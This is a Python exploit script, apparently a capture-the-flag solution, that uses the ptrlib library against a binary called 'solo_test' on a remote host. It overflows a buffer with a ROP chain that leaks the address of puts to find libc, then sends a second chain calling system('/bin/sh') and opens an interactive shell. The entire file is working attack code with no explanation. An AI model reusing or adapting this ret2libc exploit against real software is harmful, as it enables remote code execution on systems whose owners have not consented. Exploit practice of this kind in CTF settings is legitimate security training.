from ptrlib import *

elf = ELF("./solo_test")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("./solo_test")
sock = Socket("115.68.235.72", 1337)
libc = ELF("./libc6_2.29-0ubuntu2_amd64.so")
rop_pop_rdi = 0x00400b83

# Stage 1
payload = b'A' * 0x58
payload += p64(rop_pop_rdi)
payload += p64(elf.got('puts'))
payload += p64(elf.plt('puts'))
payload += p64(elf.symbol('_start'))

sock.sendafter(">> ", "Me")
sock.sendafter(">> ", "No")
sock.sendafter(">> ", "CTF")
sock.sendafter(">> ", "Never")
sock.sendafter(">> ", "No")

sock.sendafter("> ", payload)
libc_base = u64(sock.recvline()) - libc.symbol('puts')
logger.info("libc = " + hex(libc_base))

# Stage 2
payload = b'A' * 0x58
payload += p64(rop_pop_rdi + 1)
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find('/bin/sh')))
payload += p64(libc_base + libc.symbol('system'))

sock.sendafter(">> ", "Me")
sock.sendafter(">> ", "No")
sock.sendafter(">> ", "CTF")
sock.sendafter(">> ", "Never")
sock.sendafter(">> ", "No")

sock.sendafter("> ", payload)

sock.interactive()
